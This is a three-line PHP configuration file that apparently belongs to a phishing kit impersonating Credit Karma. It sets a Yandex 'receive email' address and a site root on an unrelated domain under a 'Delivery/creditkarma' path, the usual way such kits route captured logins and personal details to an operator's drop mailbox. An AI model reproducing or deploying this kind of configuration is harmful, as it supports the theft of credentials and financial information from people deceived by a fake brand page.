<?php
    $Receive_email = "toymaxxbodan@yandex.com";
    $site_root = "http://geektasticreview.com/Delivery/creditkarma";
?>